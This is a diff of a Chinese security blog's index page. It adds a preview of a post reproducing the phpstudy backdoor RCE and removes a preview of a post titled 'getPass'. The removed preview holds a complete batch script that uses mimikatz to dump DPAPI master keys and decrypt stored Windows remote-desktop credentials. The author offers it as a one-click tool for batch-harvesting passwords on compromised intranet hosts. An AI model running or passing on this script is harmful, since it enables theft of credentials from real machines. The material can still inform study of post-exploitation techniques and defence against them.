@@ -193,6 +193,104 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/blogAvatar2.jpg">
+      <meta itemprop="name" content="redn3ck">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="redn3ck's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">Phpstudy - RCE 复现</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2019-10-12 16:15:58" itemprop="dateCreated datePublished" datetime="2019-10-12T16:15:58+08:00">2019-10-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-09-27 10:21:41" itemprop="dateModified" datetime="2021-09-27T10:21:41+08:00">2021-09-27</time>
+              </span>
+
+          
+            <span id="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/" class="post-meta-item leancloud_visitors" data-flag-title="Phpstudy - RCE 复现" title="阅读次数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span class="leancloud-visitors-count"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="check"><a class="header-anchor" href="#check">¶</a>check</h2>
+<p>9月26号就写好了，一下子就到这个时候了，严重拖延症</p>
+<p>先用公开的脚本check一下自己机器上常用的，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/dIDfgFxHlqenKRUSW7Oqkw">phpstudy后门文件分析以及检测脚本</a></p>
+<img src="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/check.jpg" class="">
+<p>呵呵，中招，一直在使用<code>phpstudy2016</code>版，上图是2018测试的（我的2016一样中招，被我修复了，没截图），也就是说做肉鸡三年了(微笑)，不过好在我只在用的时候开启<code>apache</code>。</p>
+<div class="note info"><p>阅读本篇文章能了解到：<span class="label success">phpstudy</span>, <span class="label success">RCE</span></p></div>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2019/10/12/Phpstudy-RCE-%E5%A4%8D%E7%8E%B0/#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2019/10/12/0708-CVE-2019-0708-%E5%A4%8D%E7%8E%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1093,107 +1191,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://redn3ck.github.io/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/blogAvatar2.jpg">
-      <meta itemprop="name" content="redn3ck">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="redn3ck's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">getPass - 一键批量获取远程终端凭据密码</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2018-01-18 17:53:00" itemprop="dateCreated datePublished" datetime="2018-01-18T17:53:00+08:00">2018-01-18</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-09-27 10:19:25" itemprop="dateModified" datetime="2021-09-27T10:19:25+08:00">2021-09-27</time>
-              </span>
-
-          
-            <span id="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" class="post-meta-item leancloud_visitors" data-flag-title="getPass - 一键批量获取远程终端凭据密码" title="阅读次数">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-eye"></i>
-              </span>
-              <span class="post-meta-item-text">阅读次数：</span>
-              <span class="leancloud-visitors-count"></span>
-            </span>
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1>前言</h1>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MjM5MDkwNjA2Nw==&amp;mid=2650374152&amp;idx=2&amp;sn=53def8b9c8301d0c027cad32e8982c1a&amp;chksm=beb083b489c70aa2474210a70a15ef7d978bd1a3b29de0ead7da65261cd7bd027364a2494ea2&amp;mpshare=1&amp;scene=23&amp;srcid=12298b5FBQUycN1sXhWdm6gV#rd">【奇技淫巧】破解远程终端凭据，获取服务器密码</a></p>
-</blockquote>
-<p>想必大家都看了这篇文章吧，土司12月推送的，非常好的破解方式，内网中能起到相当大的作用，相信不少人已经去实践了一遍，过程之繁琐真是让我们这些人望而却步。</p>
-<p>我可不想每拿到一台内网机，都要重复的去做这么复杂的操作，而且每一个凭据都要做一遍。</p>
-<p>对批处理不熟，花了几天时间，写了个bat，一键批量获取。</p>
-<h1>Code</h1>
-<figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] <span class="built_in">Start</span>. Code by redn3ck.</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> flag=<span class="number">0</span>	<span class="built_in">REM</span> 判断是否存在Credentials</span><br><span class="line"><span class="keyword">for</span> /f <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">dir</span> /a/s/b c:\Users\Administrator\AppData\Local\Microsoft\Credentials&#x27;) <span class="keyword">do</span> (</span><br><span class="line">	<span class="keyword">if</span> <span class="keyword">exist</span> <span class="variable">%%i</span> (</span><br><span class="line">		<span class="built_in">set</span> file=<span class="variable">%%i</span></span><br><span class="line">		<span class="built_in">set</span> flag=<span class="number">1</span></span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">!file!</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> /f &quot;delims=: tokens=<span class="number">1</span>,<span class="number">2</span>&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;mimikatz.exe &quot;dpapi::cred /<span class="keyword">in</span>:<span class="variable">!file!</span>&quot; &quot;<span class="keyword">exit</span>&quot; ^| <span class="built_in">findstr</span> guidMasterKey&#x27;) <span class="keyword">do</span> <span class="built_in">set</span> guidMasterKey=<span class="variable">%%j</span></span><br><span class="line"><span class="comment">		REM echo !guidMasterKey!</span></span><br><span class="line"></span><br><span class="line">		mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::dpapi&quot; &quot;<span class="keyword">exit</span>&quot; &gt; MasterKey.txt</span><br><span class="line">			</span><br><span class="line"><span class="comment">		REM findstr /n 返回行号 example: 1:       * GUID      :  &#123;b619a08d-f4c3-408d-b733-bc89bd94ca0b&#125;</span></span><br><span class="line">		<span class="keyword">for</span> /f &quot;delims=:&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">findstr</span> /n &quot;<span class="variable">!guidMasterKey!</span>&quot; MasterKey.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line">		<span class="built_in">set</span> /a lineNum=<span class="variable">%%i</span>+<span class="number">1</span></span><br><span class="line"><span class="comment">		REM echo !lineNum!</span></span><br><span class="line">		<span class="keyword">call</span> :next</span><br><span class="line">		)</span><br><span class="line">	)</span><br><span class="line">)</span><br><span class="line">:end</span><br><span class="line"><span class="keyword">if</span> <span class="variable">!flag!</span>==<span class="number">0</span> <span class="built_in">echo</span> [-] No credentials :(</span><br><span class="line"><span class="built_in">echo</span>.</span><br><span class="line"><span class="built_in">echo</span> [+] End</span><br><span class="line"><span class="keyword">exit</span> /b	</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line"><span class="keyword">for</span> /f &quot;skip=<span class="variable">%lineNum%</span> delims=&quot; <span class="variable">%%i</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> MasterKey.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line"><span class="built_in">set</span> MasterKeyTemp=<span class="variable">%%i</span></span><br><span class="line"><span class="keyword">goto</span> next2</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">:next2</span><br><span class="line"><span class="built_in">set</span> MasterKey=<span class="variable">%MasterKeyTemp:~16%</span></span><br><span class="line"><span class="comment">REM echo %MasterKey%</span></span><br><span class="line">mimikatz &quot;dpapi::cred /<span class="keyword">in</span>:<span class="variable">%file%</span> /masterkey:<span class="variable">%MasterKey%</span>&quot; &quot;<span class="keyword">exit</span>&quot; &gt; pass.txt</span><br><span class="line"><span class="built_in">findstr</span> &quot;TargetName UserName CredentialBlob&quot; pass.txt</span><br><span class="line"><span class="built_in">del</span> MasterKey.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-          <!--noindex-->
-            <div class="post-button">
-              <a class="btn" href="/2018/01/18/getPass-%E4%B8%80%E9%94%AE%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E5%87%AD%E6%8D%AE%E5%AF%86%E7%A0%81/#more" rel="contents">
-                阅读全文 &raquo;
-              </a>
-            </div>
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1265,14 +1262,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-count">23</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-count">46</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
